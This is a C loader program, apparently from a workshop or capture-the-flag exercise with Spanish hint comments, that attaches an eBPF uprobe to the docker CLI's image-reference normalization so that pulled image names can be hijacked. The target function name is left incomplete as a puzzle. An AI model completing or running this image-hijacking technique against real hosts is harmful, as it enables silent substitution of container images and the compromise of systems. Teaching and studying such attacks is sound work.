#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/resource.h>

#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "docker.skel.h"


struct event {
    int pid;
    char comm[16];
    bool success;
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hijacked image successful\n");
    else
        printf("Failed to hijack image, sad day\n");
    return 0;
}

static volatile __sig_atomic_t exiting;

int main(void) {

    struct ring_buffer *rb = NULL;
    struct docker *skel;
    int err = 0;

    LIBBPF_OPTS(bpf_uprobe_opts, uprobe_opts);

    skel = docker__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program\n");
        return 1;
    }

    err = docker__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load BPF program: %s\n", strerror(-err));
        goto cleanup;
    }

    // Esta función no está completa, busca que función interesa hookear, la ruta te la doy como pista
    // A los primeros os doy una pegatina
	uprobe_opts.func_name = "github.com/docker/cli/vendor/github.com/distribution/reference.";
	uprobe_opts.retprobe = true;
	skel->links.trace_normalized_path = bpf_program__attach_uprobe_opts(
		skel->progs.trace_normalized_path, -1, 
        "/usr/bin/docker",
		0, 
        &uprobe_opts);
	if (!skel->links.trace_normalized_path) {
		err = -errno;
		fprintf(stderr, "Failed to attach uprobe: %d\n", err);
		goto cleanup;
	}


    err = docker__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(-err));
        goto cleanup;
    }

    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    docker__destroy(skel);
    return err;
}